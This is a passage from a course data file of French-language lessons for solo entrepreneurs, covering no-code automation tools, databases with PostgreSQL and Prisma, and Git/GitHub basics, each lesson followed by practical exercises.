<p>Tu n'as pas toujours besoin de coder pour connecter des services. Les plateformes d'automatisation no-code font le travail — et elles le font vite. Pour un freelance où un consultant qui lance son premier produit, ces outils sont des accélérateurs incroyables.</p>

<h3>Make (ex-Integromat)</h3>
<p>Make est un outil visuel qui te permet de créer des workflows d'automatisation en connectant des modules comme des pièces de puzzle. Tu relies un déclencheur (trigger) à une où plusieurs actions. Par exemple : "Quand je reçois un email avec une pièce jointe PDF, extraire le texte, l'envoyer à Claude pour analyse, et sauvegarder le résumé dans Google Sheets."</p>
<p>Make est plus puissant que Zapier pour les workflows complexes : tu peux créer des boucles, des conditions, des filtres, des agrégations. L'interface visuelle montre clairement le flux de données, ce qui facilite le débugage. Le plan gratuit permet 1000 opérations par mois — suffisant pour tester et prototyper.</p>
<p><strong>Exemple concret :</strong> Un e-commerçant utilise Make pour automatiser : nouvelle commande Shopify → créer une ligne dans Google Sheets → envoyer un email de confirmation personnalisé → notifier l'équipe sur Slack → ajouter le client dans Mailchimp. Tout ça, sans une seule ligne de code.</p>

<h3>Zapier</h3>
<p>Zapier est le pionnier de l'automatisation. Il connecte plus de 5000 applications entre elles avec des "Zaps" (trigger + action). Son interface est plus simple que Make mais moins flexible pour les workflows complexes. C'est le choix idéal pour les automatisations simples et rapides.</p>
<p>Le plan gratuit permet 100 tâches par mois et 5 Zaps actifs. C'est limité mais suffisant pour démarrer. Le gros avantage de Zapier : le catalogue d'intégrations est immense, et les connecteurs sont généralement très bien maintenus.</p>

<h3>n8n</h3>
<p>n8n est l'alternative open-source et self-hosted. Tu le déploies sur ton serveur et tu crées des workflows similaires à Make. L'avantage : pas de limites sur le nombre d'exécutions et un contrôle total sur tes données (important pour le RGPD). L'inconvénient : tu dois le maintenir toi-même (mises à jour, sauvegardes, monitoring).</p>
<p>n8n est particulièrement intéressant pour les agences et les consultants qui gèrent des données sensibles pour leurs clients. Aucune donnée ne transite par un service tiers — tout reste sur ton infrastructure.</p>
<p><strong>Conseil pro :</strong> Commence avec Make où Zapier pour la rapidité de mise en place. Migre vers n8n quand tu as besoin de plus de volume où de plus de contrôle. Ne commence pas par n8n si tu débutes — la courbe d'apprentissage est plus raide.</p>

<h2>Quand utiliser quoi</h2>
<p>Le choix entre webhooks codés et automatisations no-code dépend de la criticité et de la complexité du flux :</p>
<ul>
<li><strong>Webhooks codés</strong> : Pour les flux critiques de ton MVP (paiements, inscriptions, mises à jour de données sensibles). Tu as un contrôle total, une performance maximale et une fiabilité garantie. Si ça casse, tu peux débuguer et corriger rapidement.</li>
<li><strong>Make/Zapier</strong> : Pour les automatisations annexes (notifications Slack, synchronisation avec un CRM, envoi de rapports hebdomadaires). Rapide à mettre en place, facile à modifier, pas besoin de coder. Si ça casse, l'impact est limité.</li>
<li><strong>n8n</strong> : Quand tu veux la puissance de Make sans les coûts et avec le contrôle total. Idéal pour les agences qui gèrent des automatisations pour leurs clients et qui veulent facturer le service.</li>
</ul>

<blockquote>Un bon MVP combine des webhooks codés pour les fonctions critiques et des automatisations no-code pour tout le reste. Ne code pas ce que tu peux automatiser en 5 minutes. Ton temps est ton ressource la plus précieuse.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Crée un compte gratuit sur <strong>Make.com</strong>. Explore l'interface et familiarise-toi avec les modules disponibles.</li>
<li>Crée un scénario simple sur Make : "Quand je reçois un email sur Gmail, envoyer une notification sur Slack (où Discord)." Teste-le en t'envoyant un email.</li>
<li>Demande à Claude : "Écris-moi une route API Next.js qui reçoit un webhook Stripe pour le paiement réussi et met à jour le statut de l'utilisateur en base de données." Lis le code et identifie la vérification de signature.</li>
<li>Va sur webhook.site — c'est un outil gratuit qui génère une URL de test. Copie ton URL et envoie-lui une requête POST depuis la console du navigateur. Observe les données reçues.</li>
<li>Dessine sur papier le flux d'automatisation idéal pour ton futur MVP : quels événements, quels services, quelles actions.</li>
</ol>`,
  },
  {
    order: 35,
    module: 4,
    title: "Bases de données : stocker et gérer les données",
    slug: "bases-de-données-stocker-gérer-données",
    duration: "55 min",
    description: "Comprendre les bases de données pour stocker les données de ton MVP.",
    content: `<h2>Pourquoi tu as besoin d'une base de données</h2>
<p>Ton MVP va manipuler des données : des utilisateurs, des produits, des commandes, des messages, des fichiers. Ces données doivent être stockées quelque part de manière organisée, sécurisée et performante. C'est le rôle de la base de données — le coffre-fort numérique de ton application.</p>
<p>Sans base de données, tu perdrais toutes les données à chaque redémarrage du serveur. C'est comme tenir les comptes de ton business sur un tableau blanc : dès que quelqu'un l'efface, tout est perdu. Imagine un e-commerce où les commandes disparaissent à chaque mise à jour du site — catastrophique.</p>
<p>Pour être plus concret : quand un utilisateur s'inscrit sur ton MVP, ses informations (nom, email, mot de passe hashé) sont sauvegardées dans la base de données. Quand il se reconnecte le lendemain, la base de données retrouve ses informations et lui montre son tableau de bord personnalisé. Sans base de données, chaque visite serait comme une première visite — aucune mémoire.</p>
<p><strong>Astuce :</strong> Pense à la base de données comme à un classeur ultra-organisé avec des dossiers (tables), des fiches (lignes) et des rubriques (colonnes). La différence avec un vrai classeur : une base de données peut chercher parmi des millions de fiches en quelques millisecondes.</p>

<h2>SQL vs NoSQL : deux philosophies</h2>
<h3>Bases SQL (relationnelles)</h3>
<p>Les bases de données SQL organisent les données en tables avec des colonnes et des lignes, comme un tableur Excel très structuré. Chaque table à un schéma rigide qui définit les colonnes et leurs types. Les tables sont liées entre elles par des relations (d'où le nom "relationnelles"). C'est le modèle le plus ancien, le plus éprouvé et le plus utilisé au monde.</p>
<p>L'analogie parfaite : imagine un ensemble de tableurs Excel interconnectés. Tu as un tableur "Clients" avec les colonnes Nom, Email, Téléphone. Un tableur "Commandes" avec les colonnes Date, Montant, ClientID. Le ClientID relie chaque commande à un client spécifique. C'est exactement comme ça que fonctionne une base SQL.</p>
<ul>
<li><strong>PostgreSQL</strong> : La référence open-source. Robuste, performant, riche en fonctionnalités. C'est ce que tu utiliseras dans ton MVP et c'est le choix de la grande majorité des startups modernes. Instagram, Spotify, Reddit — tous utilisent PostgreSQL.</li>
<li><strong>SQLite</strong> : Une base de données en un seul fichier. Parfaite pour le prototypage et les petites applications. Pas besoin de serveur — le fichier de base de données vit directement sur ton disque. Idéal pour les applications mobiles où les tests.</li>
<li><strong>MySQL</strong> : Historiquement très populaire (WordPress l'utilise). Moins moderne que PostgreSQL mais encore très répandu. Si tu travailles avec des clients qui ont des sites WordPress, tu rencontreras MySQL.</li>
</ul>
<p>SQL (Structured Query Language) est le langage pour interagir avec ces bases. C'est un langage simple et expressif qui se lit presque comme de l'anglais :</p>
<ul>
<li><code>SELECT * FROM users WHERE plan = 'pro'</code> — Lister tous les utilisateurs Pro. Le <code>*</code> signifie "toutes les colonnes".</li>
<li><code>INSERT INTO users (name, email) VALUES ('Alice', 'alice@example.com')</code> — Créer un utilisateur. Les données sont insérées dans les colonnes spécifiées.</li>
<li><code>UPDATE users SET plan = 'pro' WHERE id = 42</code> — Mettre à jour un utilisateur spécifique. Le <code>WHERE</code> cible précisément la ligne à modifier.</li>
<li><code>DELETE FROM users WHERE id = 42</code> — Supprimer un utilisateur. Attention, c'est irréversible ! En production, on préfère souvent un "soft delete" (marquer comme supprimé sans vraiment effacer).</li>
</ul>
<p><strong>Attention :</strong> Tu n'auras pas besoin d'écrire du SQL directement — Prisma (qu'on verra plus bas) le fait pour toi. Mais comprendre la logique SQL t'aide à débuguer et à comprendre ce que fait Claude Code en coulisses.</p>

<h3>Bases NoSQL</h3>
<p>Les bases NoSQL sont plus flexibles. Les données sont stockées sous forme de documents (comme du JSON) sans schéma rigide. Chaque document peut avoir une structure différente. C'est plus souple mais aussi plus risqué : sans schéma strict, les données peuvent devenir inconsistantes avec le temps.</p>
<ul>
<li><strong>MongoDB</strong> : La base NoSQL la plus populaire. Les données sont des documents JSON. Très populaire dans l'écosystème JavaScript, mais pour un MVP structuré, PostgreSQL reste un meilleur choix.</li>
<li><strong>Redis</strong> : Une base en mémoire ultra-rapide, idéale pour le cache et les sessions. Redis ne remplace pas PostgreSQL — il le complète pour les données temporaires qui nécessitent un accès très rapide.</li>
<li><strong>Firebase Firestore</strong> : La base NoSQL de Google, avec synchronisation en temps réel. Pratique pour les prototypes rapides, mais elle peut devenir coûteuse et difficile à gérer à mesure que ton app grandit.</li>
</ul>
<p>Pour un MVP, PostgreSQL est presque toujours le meilleur choix. C'est ce que recommandent la plupart des experts et c'est ce que Claude Code sait le mieux utiliser. Tu pourras toujours ajouter Redis plus tard pour le cache si tu as des problèmes de performance.</p>
<p><strong>Conseil pro :</strong> Ne te laisse pas séduire par les tendances. MongoDB était très à la mode il y a quelques années, mais beaucoup de projets ont migré vers PostgreSQL par la suite. Pour un MVP, la fiabilité et la simplicité de PostgreSQL sont imbattables.</p>

<h2>Le data modeling : concevoir ta base</h2>
<p>Avant de coder, tu dois réfléchir à la structure de tes données. C'est le data modeling — l'étape la plus importante et la plus souvent négligée par les débutants. Tu définis tes entités (User, Product, Order), leurs attributs (name, email, price) et les relations entre elles (un User a plusieurs Orders, un Order contient plusieurs Products).</p>
<p>C'est comme dessiner le plan de ta maison avant de poser la première brique. Si tu te trompes dans le plan, tu passeras des jours à casser et reconstruire. Si le plan est bon, la construction sera fluide.</p>
<p>Les types de relations — c'est un concept clé que tu dois absolument comprendre :</p>
<ul>
<li><strong>One-to-One</strong> : Un utilisateur à un profil. Un profil appartient à un utilisateur. C'est une relation 1:1. En pratique, on met souvent les données dans la même table plutôt que de créer deux tables séparées.</li>
<li><strong>One-to-Many</strong> : Un utilisateur a plusieurs commandes. Une commande appartient à un seul utilisateur. C'est la relation la plus courante. On ajoute un <code>userId</code> dans la table des commandes pour faire le lien.</li>
<li><strong>Many-to-Many</strong> : Un produit peut être dans plusieurs commandes. Une commande peut contenir plusieurs produits. C'est la relation la plus complexe : elle nécessite une table de liaison (souvent appelée "pivot table" où "junction table") pour stocker les associations.</li>
</ul>
<p><strong>Astuce :</strong> Dessine toujours ton schéma de données sur papier où dans un outil comme Excalidraw avant de coder. Montre-le à Claude et demande-lui : "Est-ce que ce schéma est cohérent ? Qu'est-ce que j'ai oublié ?" Il repérera les erreurs de conception que tu aurais manquées.</p>

<h2>Prisma : l'ORM qui simplifie tout</h2>
<p>Prisma est un ORM (Object-Relational Mapping) pour TypeScript. Au lieu d'écrire du SQL brut, tu interagis avec ta base de données en utilisant du code TypeScript type-safe. C'est comme avoir un traducteur entre ton code et la base de données : tu parles TypeScript, Prisma traduit en SQL. Claude Code utilise Prisma par défaut dans tous les projets Next.js.</p>
<p>Tu définis ton schéma dans un fichier <code>schema.prisma</code> :</p>
<p><code>model User { id Int @id @default(autoincrement()) name String email String @unique plan String @default("free") createdAt DateTime @default(now()) orders Order[] }</code></p>
<p>Ce schéma dit : "Un utilisateur à un id auto-incrémenté, un nom, un email unique, un plan par défaut 'free', une date de création automatique, et une liste de commandes." C'est clair, lisible et Claude Code le génère parfaitement.</p>
<p>Puis Prisma génère automatiquement les types TypeScript et les fonctions pour interagir avec la base :</p>
<ul>
<li><code>prisma.user.findMany()</code> — Lister tous les utilisateurs. Tu peux ajouter des filtres : <code>prisma.user.findMany({ where: { plan: "pro" } })</code></li>
<li><code>prisma.user.create({ data: { name: "Alice", email: "alice@example.com" } })</code> — Créer un utilisateur. Prisma valide les types automatiquement.</li>
<li><code>prisma.user.update({ where: { id: 42 }, data: { plan: "pro" } })</code> — Mettre à jour un utilisateur spécifique.</li>
<li><code>prisma.user.delete({ where: { id: 42 } })</code> — Supprimer un utilisateur.</li>
<li><code>prisma.user.findUnique({ where: { email: "alice@example.com" }, include: { orders: true } })</code> — Trouver un utilisateur par email et inclure ses commandes. La magie des relations !</li>
</ul>
<p><strong>Conseil pro :</strong> L'autocomplétion de Prisma dans VS Code est incroyable. Quand tu tapes <code>prisma.user.</code>, tu vois toutes les opérations disponibles. Quand tu tapes <code>where: {</code>, tu vois tous les champs disponibles. C'est comme avoir un assistant qui te montre ce qui est possible à chaque instant.</p>

<h2>Les migrations : faire évoluer ta base</h2>
<p>Quand tu modifies ton schéma Prisma (ajouter un champ, créer une table, modifier un type), tu dois faire une migration. C'est un script qui applique les changements à la base de données sans perdre les données existantes. La commande est simple : <code>npx prisma migrate dev --name ajout-champ-telephone</code>.</p>
<p>Pourquoi les migrations sont essentielles ? Imagine que tu ajoutes un champ "téléphone" à ta table utilisateurs. Sans migration, tu devrais supprimer la base et la recréer — en perdant toutes les données existantes. Avec une migration, Prisma ajoute le champ à la table existante sans toucher aux données.</p>
<p>Prisma garde un historique de toutes les migrations dans le dossier <code>prisma/migrations/</code>. Cet historique te permet de reproduire exactement la même base de données sur n'importe quel ordinateur où serveur. C'est comme un journal de bord de tous les changements structurels de ta base.</p>
<p><strong>Attention :</strong> Ne modifie jamais manuellement les fichiers de migration une fois qu'ils ont été appliqués. Si tu fais une erreur, crée une nouvelle migration pour la corriger. Les migrations sont comme l'historique Git de ta base de données — elles doivent rester intactes.</p>

<h2>Héberger ta base de données</h2>
<p>Ta base de données a besoin d'un serveur pour tourner. Heureusement, plusieurs plateformes proposent des bases de données PostgreSQL gratuites où très abordables, parfaites pour un MVP :</p>
<ul>
<li><strong>Neon</strong> : PostgreSQL serverless gratuit pour les petits projets. Idéal pour un MVP. La base se met en veille quand personne ne l'utilise et se réveille instantanément quand une requête arrive. Tu ne payes que pour ce que tu consommes.</li>
<li><strong>Supabase</strong> : PostgreSQL avec une interface admin, authentification intégrée et API auto-générée. C'est un couteau suisse : base de données + auth + stockage de fichiers + fonctions serverless. Très populaire auprès des makers.</li>
<li><strong>Railway</strong> : PostgreSQL avec un plan gratuit généreux. Interface simple et propre, logs en temps réel, monitoring intégré. Excellent pour les projets qui ont aussi un backend custom.</li>
<li><strong>PlanetScale</strong> : MySQL serverless avec un branching de base de données (comme les branches Git, mais pour ta BDD). Très innovant, mais utilise MySQL au lieu de PostgreSQL.</li>
</ul>
<p><strong>Conseil pro :</strong> Commence avec Neon pour ton MVP — c'est le plus simple à configurer et le plan gratuit est suffisant pour les premiers mois. Tu pourras migrer vers Supabase où Railway si tu as besoin de fonctionnalités supplémentaires.</p>

<blockquote>Avec Prisma et Claude Code, tu n'as pas besoin de maîtriser le SQL. Mais comprendre les concepts de base te permettra de débuguer plus efficacement et de prendre de meilleures décisions d'architecture. Un bon schéma de données est la fondation de tout bon produit.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Dessine sur papier le schéma de données pour un MVP simple (une app de gestion de tâches) : quelles tables, quels champs, quelles relations entre User, Project et Task.</li>
<li>Demande à Claude : "Écris un schéma Prisma pour une application de gestion de tâches avec des utilisateurs, des projets et des tâches. Chaque utilisateur peut avoir plusieurs projets, et chaque projet a plusieurs tâches." Analyse le schéma généré.</li>
<li>Crée un compte gratuit sur <strong>Neon</strong> (neon.tech) et crée une base de données PostgreSQL. Copie la connection string — tu en auras besoin plus tard.</li>
<li>Si tu as Node.js installé, initialise un projet avec <code>npm init -y && npm install prisma @prisma/client && npx prisma init</code>. Explore les fichiers créés, en particulier <code>schema.prisma</code>.</li>
<li>Demande à Claude : "Montre-moi les 10 requêtes Prisma les plus courantes pour un CRUD complet d'utilisateurs." Lis et comprends chaque requête.</li>
</ol>`,
  },
  // Lesson 36 — Git & GitHub
  {
    order: 36,
    module: 4,
    title: "Git & GitHub : versionner et collaborer",
    slug: "git-github-versionner-collaborer",
    duration: "50 min",
    description: "Maîtriser Git et GitHub pour versionner ton code, collaborer efficacement et ne jamais perdre ton travail.",
    content: `<h2>Pourquoi Git est indispensable</h2>
<p>Imagine que tu travailles sur ton MVP depuis trois semaines. Tu as un site fonctionnel, un système de paiement intégré, une base de données bien structurée. Et puis, un mardi soir, tu fais une modification qui casse tout. Le site ne fonctionne plus. Tu essaies de revenir en arrière, mais tu ne te souviens plus exactement de ce que tu as changé. Tu passes la nuit à tenter de réparer, et au matin, tu réalises que tu as aggravé la situation. C'est un cauchemar — et c'est exactement ce que Git empêche.</p>
<p>Git est un système de contrôle de version. Il enregistre chaque modification que tu fais dans ton code, comme un historique infini de sauvegardes. À tout moment, tu peux revenir à n'importe quelle version précédente de ton projet. C'est comme un "Ctrl+Z" surpuissant qui fonctionne sur des semaines, des mois, voire des années de travail. Chaque sauvegarde est horodatée, documentée et récupérable en quelques secondes.</p>
<p>Mais Git ne sert pas uniquement à sauvegarder. Il te permet aussi de travailler sur plusieurs fonctionnalités en parallèle sans qu'elles interfèrent entre elles (les branches), de collaborer avec d'autres personnes sans écraser leur travail, et de déployer ton application de manière automatisée. Tous les outils modernes — Vercel, Railway, Render — se connectent à Git pour déployer ton code automatiquement à chaque modification.</p>
<p><strong>Astuce :</strong> Même si tu travailles seul sur ton MVP, Git est indispensable. Ce n'est pas un outil de collaboration, c'est un outil de survie. Le jour où tu casses quelque chose (et ça arrivera), tu seras reconnaissant d'avoir un historique complet de chaque modification.</p>
<p><strong>Conseil pro :</strong> Les recruteurs, les investisseurs et les clients techniques regardent les profils GitHub. Un historique Git propre montre que tu sais travailler de manière professionnelle. Pour un freelance tech où un consultant qui vend des services digitaux, c'est un signal de crédibilité fort.</p>

<h2>Les concepts fondamentaux de Git</h2>
<p>Git fonctionne avec quatre zones distinctes que tu dois comprendre pour ne jamais être perdu. Pense à ça comme une chaîne de production : les pièces passent d'un atelier à l'autre avant d'être livrées au client.</p>

<h3>Le Working Directory (répertoire de travail)</h3>
<p>C'est ton dossier de projet, là où tu modifies les fichiers. Quand tu ouvres un fichier dans VS Code et que tu le modifies, tu travailles dans le working directory. Git surveille ce dossier et détecte chaque changement : un fichier modifié, un nouveau fichier créé, un fichier supprimé. À ce stade, les modifications ne sont pas encore sauvegardées dans l'historique Git — elles sont "en cours".</p>

<h3>Le Staging Area (zone de préparation)</h3>
<p>Avant de sauvegarder tes modifications, tu les places dans une zone de préparation avec la commande <code>git add</code>. C'est comme préparer un colis avant de l'envoyer : tu choisis quels fichiers tu veux inclure dans la prochaine sauvegarde. Tu peux ajouter tous les fichiers modifiés d'un coup (<code>git add .</code>) où sélectionner fichier par fichier (<code>git add src/components/Button.tsx</code>). Cette étape te donne un contrôle fin sur ce que tu sauvegardes.</p>

<h3>Le Commit (la sauvegarde)</h3>
<p>Un commit est une photo de ton projet à un instant précis. Quand tu fais <code>git commit -m "Ajout du formulaire de contact"</code>, Git enregistre l'état de tous les fichiers du staging area avec un message descriptif, un identifiant unique (un hash), la date, et ton nom. C'est irréversible et permanent — ce commit existera pour toujours dans l'historique. Chaque commit est comme une page de journal de bord : il documente ce qui a changé et pourquoi.</p>

<h3>Le Remote (le serveur distant)</h3>
<p>Le remote est la copie de ton projet sur un serveur — généralement GitHub. Quand tu fais <code>git push</code>, tu envoies tes commits locaux vers le serveur. Quand tu fais <code>git pull</code>, tu récupères les commits du serveur sur ta machine. Le remote sert de sauvegarde externe (si ton disque dur meurt, ton code est en sécurité) et de point de synchronisation pour la collaboration.</p>
<p>Le flux de travail standard est donc : tu modifies des fichiers (working directory) → tu prépares la sauvegarde (<code>git add</code>) → tu sauvegardes (<code>git commit</code>) → tu envoies sur le serveur (<code>git push</code>). Ce cycle se répète des dizaines de fois par jour.</p>
<p><strong>Attention :</strong> Ne confonds pas <code>git add</code> et <code>git commit</code>. Le <code>git add</code> prépare les changements, le <code>git commit</code> les sauvegarde. C'est une erreur classique des débutants : faire <code>git commit</code> sans avoir fait <code>git add</code> avant — et se demander pourquoi rien n'est sauvegardé.</p>

<h2>GitHub : le hub social du code</h2>
<p>GitHub est la plateforme qui héberge tes dépôts Git en ligne. C'est le réseau social des développeurs — sauf qu'au lieu de partager des photos, on partage du code. Plus de 100 millions de développeurs utilisent GitHub. C'est là que tu stockeras ton code, que tu suivras les problèmes et que tu déploieras ton application.</p>

<h3>Les repositories (dépôts)</h3>
<p>Un repository (où "repo") est un projet sur GitHub. Chaque MVP a son propre repo. Tu peux le rendre public (visible par tout le monde, utile pour les projets open-source et pour montrer ton travail) où privé (visible uniquement par toi et les personnes que tu invites, essentiel pour les projets clients). Un repo contient ton code, l'historique Git complet, la documentation et les configurations.</p>

<h3>Les Issues</h3>
<p>Les Issues sont le système de suivi des tâches et des bugs intégré à GitHub. Chaque issue décrit un problème à résoudre où une fonctionnalité à ajouter. Tu peux les organiser avec des labels (bug, feature, urgent), les assigner à quelqu'un, et les relier à des commits. Pour un freelance, les issues sont un excellent moyen de planifier le développement de ton MVP : une issue par fonctionnalité, tu avances étape par étape.</p>

<h3>Les Pull Requests (PR)</h3>
<p>Une Pull Request est une demande de fusion d'une branche dans une autre. Tu travailles sur une fonctionnalité dans une branche séparée, puis tu crées une PR pour la fusionner dans la branche principale. La PR montre exactement ce qui a changé, permet de faire une revue de code, et s'intègre avec les tests automatiques. Même si tu travailles seul, utiliser des PR est une bonne habitude : tu peux relire ton propre code avant de le fusionner et repérer des erreurs.</p>

<h3>GitHub Actions</h3>
<p>GitHub Actions est le système d'automatisation de GitHub. Tu peux configurer des workflows qui se déclenchent automatiquement : lancer les tests à chaque push, déployer l'application quand tu fusionnes dans la branche principale, vérifier la qualité du code. C'est le cœur du CI/CD (Continuous Intégration / Continuous Deployment) que nous verrons en détail dans la leçon sur le déploiement.</p>
<p><strong>Conseil pro :</strong> Crée ton compte GitHub dès maintenant si ce n'est pas déjà fait. Choisis un nom d'utilisateur professionnel — c'est ta carte de visite technique. Ajoute une photo de profil, une bio courte, et un lien vers ton site où ton LinkedIn. Les clients techniques vérifient souvent le GitHub des freelances avant de les embaucher.</p>

<h2>Le fichier .gitignore</h2>
<p>Tous les fichiers de ton projet n'ont pas vocation à être suivis par Git ni envoyés sur GitHub. Le fichier <code>.gitignore</code> liste les fichiers et dossiers que Git doit ignorer. C'est un fichier texte simple placé à la racine de ton projet. Sans lui, tu risques de publier des informations sensibles où de polluer ton dépôt avec des fichiers inutiles.</p>
<p>Voici ce que tu dois impérativement ignorer :</p>
<ul>
<li><strong>Les variables d'environnement</strong> : Le fichier <code>.env</code> contient tes clés API, tes mots de passe de base de données, tes secrets d'authentification. Si tu le publies sur GitHub, n'importe qui peut utiliser tes clés — et tu risques une facture salée (des bots scannent GitHub en permanence à la recherche de clés API publiées par erreur).</li>
<li><strong>Le dossier <code>node_modules/</code></strong> : Ce dossier contient toutes les dépendances npm de ton projet. Il peut peser plusieurs centaines de mégaoctets et contenir des milliers de fichiers. Il est régénéré automatiquement avec <code>npm install</code>, donc inutile de le versionner.</li>
<li><strong>Le dossier <code>.next/</code></strong> : Le dossier de build de Next.js. C'est un artefact de compilation qui est régénéré à chaque build. Le versionner polluerait inutilement ton historique Git.</li>
<li><strong>Les fichiers de base de données locaux</strong> : Les fichiers <code>.db</code>, <code>.sqlite</code> et les fichiers de données ne doivent pas être versionnés. La base de données de production vit sur un serveur séparé.</li>
<li><strong>Les fichiers système</strong> : <code>.DS_Store</code> (macOS), <code>Thumbs.db</code> (Windows) — des fichiers générés automatiquement par ton système d'exploitation.</li>
</ul>
<p>Un <code>.gitignore</code> typique pour un projet Next.js ressemble à ceci :</p>
<p><code>node_modules/ .next/ .env .env.local .env.production *.db .DS_Store</code></p>
<p><strong>Attention :</strong> Si tu as déjà commité un fichier <code>.env</code> par erreur, l'ajouter au <code>.gitignore</code> ne suffit pas — il reste dans l'historique Git. Il faut considérer que les clés sont compromises et les régénérer immédiatement. C'est une urgence de sécurité.</p>
<p><strong>Astuce :</strong> Le site gitignore.io te génère un <code>.gitignore</code> adapté à ton stack technique. Tape "Node", "Next.js", "macOS" et il te crée un fichier complet. Claude Code génère aussi automatiquement un bon <code>.gitignore</code> quand il initialise un projet.</p>

<h2>Les bonnes pratiques</h2>
<p>Git est un outil puissant, mais il peut devenir un cauchemar si tu l'utilises mal. Voici les bonnes pratiques qui feront de toi un utilisateur Git efficace et professionnel.</p>

<h3>Les commits atomiques</h3>
<p>Un commit atomique ne contient qu'un seul changement logique. Si tu ajoutes un formulaire de contact et que tu corriges un bug dans le menu de navigation, fais deux commits séparés — pas un seul qui mélange les deux. Pourquoi ? Parce que si le formulaire de contact cause un problème, tu peux annuler ce commit spécifique sans perdre la correction du bug.</p>
<p>Mauvais exemple : <code>git commit -m "Modifications diverses"</code> — impossible de savoir ce qui a changé.</p>
<p>Bon exemple : <code>git commit -m "Ajout du formulaire de contact avec validation email"</code> — clair, précis, utile.</p>

<h3>Les messages de commit clairs</h3>
<p>Un bon message de commit répond à la question "Qu'est-ce que ce commit fait ?" en une ligne concise. Voici les conventions les plus utilisées :</p>
<ul>
<li><code>feat: ajout du système de paiement Stripe</code> — une nouvelle fonctionnalité</li>
<li><code>fix: correction du bug d'inscription sur mobile</code> — une correction de bug</li>
<li><code>style: amélioration du design de la page d'accueil</code> — un changement visuel</li>
<li><code>refactor: réorganisation du code du dashboard</code> — du code restructuré sans changement de comportement</li>
<li><code>docs: ajout de la documentation de l'API</code> — de la documentation</li>
<li><code>chore: mise à jour des dépendances npm</code> — de la maintenance technique</li>
</ul>
<p>Ces préfixes sont issus de la convention "Conventional Commits". En plus d'être lisibles, ils permettent de générer automatiquement des changelogs et des numéros de version.</p>

<h3>Les branches</h3>
<p>Une branche est une copie parallèle de ton code où tu peux travailler sans affecter la version principale. La branche principale s'appelle généralement <code>main</code>. Quand tu veux ajouter une fonctionnalité, tu crées une branche dédiée, tu y travailles, et quand c'est prêt, tu la fusionnes dans <code>main</code>.</p>
<ul>
<li><code>git checkout -b feature/formulaire-contact</code> — créer une nouvelle branche et basculer dessus</li>
<li><code>git checkout main</code> — revenir sur la branche principale</li>
<li><code>git merge feature/formulaire-contact</code> — fusionner la branche dans main</li>
</ul>
<p>L'avantage des branches : si ta fonctionnalité tourne mal, tu supprimes la branche et <code>main</code> n'a pas été touchée. C'est comme travailler sur un brouillon avant de recopier au propre.</p>
<p><strong>Conseil pro :</strong> Pour un solo-preneur qui travaille seul, une stratégie simple suffit : <code>main</code> est toujours en état de marché (déployable), et tu crées une branche pour chaque fonctionnalité. Pas besoin de branches <code>develop</code>, <code>staging</code>, <code>release</code> — c'est de la complexité inutile pour un MVP.</p>

<h2>Git et Claude Code</h2>
<p>Voici une excellente nouvelle : Claude Code gère Git pour toi. Quand tu travailles avec Claude Code dans ton terminal, il utilise Git en coulisses pour suivre les modifications qu'il apporte à ton code. Tu n'as pas besoin de taper manuellement les commandes Git — Claude le fait pour toi de manière transparente.</p>
<p>Concrètement, voici comment Claude Code interagit avec Git :</p>
<ul>
<li><strong>Initialisation</strong> : Quand tu crées un nouveau projet avec Claude Code, il initialise automatiquement un dépôt Git avec un <code>.gitignore</code> adapté à ton stack. Tu n'as pas besoin de taper <code>git init</code>.</li>
<li><strong>Commits automatiques</strong> : Claude Code peut créer des commits après chaque changement significatif. Les messages sont clairs et suivent les conventions professionnelles. Tu peux aussi lui demander : "Fais un commit avec le message 'Ajout du dashboard utilisateur'."</li>
<li><strong>Branches</strong> : Tu peux demander à Claude de créer une branche pour une fonctionnalité : "Crée une branche feature/paiement-stripe et commence à implémenter le système de paiement." Il gère la création, le basculement et la fusion.</li>
<li><strong>Résolution de conflits</strong> : Si deux branches modifient le même fichier, Git signale un conflit. Claude Code peut t'aider à le résoudre en analysant les deux versions et en proposant une fusion intelligente.</li>
<li><strong>Push et Pull</strong> : Claude Code peut pousser ton code sur GitHub et récupérer les dernières modifications. Il te suffit de dire : "Pousse mes changements sur GitHub."</li>
</ul>
<p><strong>Astuce :</strong> Même si Claude Code gère Git pour toi, comprendre les concepts fondamentaux reste essentiel. Quand quelque chose ne se passe pas comme prévu (et ça arrivera), tu pourras comprendre l'erreur et guider Claude vers la bonne solution. C'est la différence entre un copilote qui comprend les instruments de vol et un passager qui espère que tout ira bien.</p>
<p><strong>Attention :</strong> Vérifie toujours que Claude a bien commité tes changements avant de quitter une session de travail. Un code non commité peut être perdu si tu changes de branche où si ton ordinateur plante. Prends l'habitude de demander : "Est-ce que tous mes changements sont commités et poussés sur GitHub ?"</p>

<blockquote>Git n'est pas qu'un outil technique — c'est ton filet de sécurité. Avec Claude Code qui le gère pour toi, tu obtiens toute la puissance de Git sans la complexité. Mais comprendre les concepts te rend autonome et professionnel.</blockquote>`,
    exercise: `<h3>Exercice pratique</h3>
<ol>
<li>Crée un compte sur <strong>GitHub</strong> (github.com) si ce n'est pas déjà fait. Complète ton profil avec une photo, une bio et un lien vers ton site où LinkedIn.</li>
<li>Crée un nouveau repository sur GitHub appelé "mon-premier-mvp". Choisis "Private" pour l'instant. Coche "Add a README file" pour initialiser le repo.</li>
<li>Clone le repo sur ta machine avec <code>git clone https://github.com/ton-username/mon-premier-mvp.git</code>. Ouvre le dossier dans VS Code.</li>
<li>Crée un fichier <code>.gitignore</code> à la racine du projet et ajoute les entrées suivantes : <code>node_modules/</code>, <code>.next/</code>, <code>.env</code>, <code>.DS_Store</code>. Fais un commit : <code>git add .gitignore && git commit -m "chore: ajout du fichier .gitignore"</code>.</li>
<li>Crée une branche <code>feature/page-accueil</code> avec <code>git checkout -b feature/page-accueil</code>. Ajoute un fichier <code>index.html</code> avec un titre. Fais un commit, puis fusionne dans <code>main</code> avec <code>git checkout main && git merge feature/page-accueil</code>. Pousse le tout sur GitHub avec <code>git push</code>.</li>
</ol>`,
  },
  // Lesson 37 — Déploiement
  {
    order: 37,
    module: 4,
    title: "Déploiement : Vercel, Railway, Render",
    slug: "déploiement-vercel-railway-render",
    duration: "50 min",
    description: "Mettre ton MVP en ligne avec les plateformes de déploiement modernes et automatiser la mise en production.",
    content: `<h2>Du code local à l'application en ligne</h2>
